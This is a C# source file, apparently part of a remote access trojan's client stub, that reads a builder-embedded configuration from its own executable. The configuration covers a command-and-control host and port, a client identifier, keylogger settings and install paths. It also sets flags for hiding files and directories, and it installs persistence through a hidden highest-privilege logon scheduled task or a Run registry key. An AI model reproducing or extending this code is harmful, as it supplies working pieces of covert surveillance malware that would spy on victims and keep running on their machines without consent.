using Client.Models;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Client.Controllers.Tools
{
    //BootController
    public class Boot
    {       
        private string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk"};

        public string host                              { get; set; }     // HOST
        public ushort port                              { get; set; }     // HOST
        public int recoTries                            { get; set; }     // TIME BETWEEN RECONNECTION TRIES
        public static string identifier                 { get; set; }     // CLIENT NAME IDENTIFIER
        public static bool installStub                  { get; set; }     // INSTALL STUB
        public static bool hideSubDirectory             { get; set; }     // INSTALL STUB
        public static bool hideFile                     { get; set; }     // INSTALL STUB
        public static string installSubDirectory = "";                    // INSTALL STUB
        public static string installFileName     = "";                    // INSTALL STUB
        public static bool keyloggerEnabled             { get; set; }     // KEYLOGGER
        public static bool hideLogsDir                  { get; set; }     // KEYLOGGER
        public string keyLoggerDirectory                { get; set; }     // KEYLOGGER
        public static string startupName                { get; set; }     // AUTOSTART STUB
        public static bool autoStartEnabled             { get; set; }     // AUTOSTART STUB

        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData; //  	%USERPROFILE%\Application Data
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);


        public Boot()
        {
            foreach (string index in readerKey)
            {
                doSomethingWithReader(index);
            }
            FixDirectory();
        }

        public static string getMutexKey(StreamReader readerMutex)
        {
            string mutex = readerMutex.ReadToEnd();
            mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
            string mutexKey = mutex.Replace("-STARTmutex-", "");
            return mutexKey;
        }

        public void doSomethingWithReader(string readerkey)
        {
            StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            
            string readerString = reader.ReadToEnd();

            readerString = readerString.Substring(readerString.IndexOf("-START" + readerkey + "-"), readerString.IndexOf("-END" + readerkey + "-") - readerString.IndexOf("-START" + readerkey + "-"));

            // LOG IN SETTINGS
            if (readerkey == "host")
            {
                host = readerString.Replace("-START" + readerkey + "-", "");
            }
            else if (readerkey == "port")
            {
                port = ushort.Parse(readerString.Replace("-START" + readerkey + "-", ""));
            }
            else if (readerkey == "recoTries")
            {
                recoTries = int.Parse(readerString.Replace("-START" + readerkey + "-", ""));
            }
            else if (readerkey == "identifier")
            {
                identifier = readerString.Replace("-START" + readerkey + "-", "");                
            }
            // KEYLOGGER SETTINGS
            else if (readerkey == "logDir")
            {
                keyLoggerDirectory = readerString.Replace("-START" + readerkey + "-", "");
            }
            // AUTOSTART SETTINGS
            else if (readerkey == "startupName")
            {
                startupName = readerString.Replace("-START" + readerkey + "-", "");
            }
            // INSTALL SETTINGS
            else if (readerkey == "installPath")
            {
                string t = readerString.Replace("-START" + readerkey + "-", "");
                if (t == "1")
                    SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
                else if (t == "2")
                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFilesX86;
                else if (t == "3")
                    SPECIALFOLDER = Environment.SpecialFolder.SystemX86;

            }
            else if (readerkey == "txtSubDirI")
            {
                startupName = readerString.Replace("-START" + readerkey + "-", "");
            }
            else if (readerkey == "txtFileNameI")
            {
                startupName = readerString.Replace("-START" + readerkey + "-", "");
            }
            // BOOLEENS
            else if (readerkey == "chk")
            {
                int i = 0;
                string t = readerString.Replace("-START" + readerkey + "-", "");
                foreach (char c in t)
                {
                    if      (i == 0)
                        keyloggerEnabled = (c == '1' ? true : false);
                    else if (i == 1)
                        autoStartEnabled = (c == '1' ? true : false);
                    else if (i == 2)
                        hideSubDirectory = (c == '1' ? true : false);
                    else if (i == 3)
                        hideFile         = (c == '1' ? true : false);
                    else if (i == 4)
                        hideLogsDir      = (c == '1' ? true : false);

                    i++;
                }
            }
            else
            {
                reader.Close();
                return;
            }

            reader.Close(); 
        }

        static void FixDirectory()
        {
            if (AuthenticationController.Win64Bit) return;

            // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
            switch (SPECIALFOLDER)
            {
                case Environment.SpecialFolder.ProgramFilesX86:
                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
                    break;
                case Environment.SpecialFolder.SystemX86:
                    SPECIALFOLDER = Environment.SpecialFolder.System;
                    break;
            }

            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        }

        public static bool AddToStartup()
        {
            if (AuthenticationController.getAccountType() == "Admin")
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + ClientData.currentPath + "\" /rl HIGHEST /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
                    true);
            }
            else
            {
                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
                    true);
            }
        }
    }
}
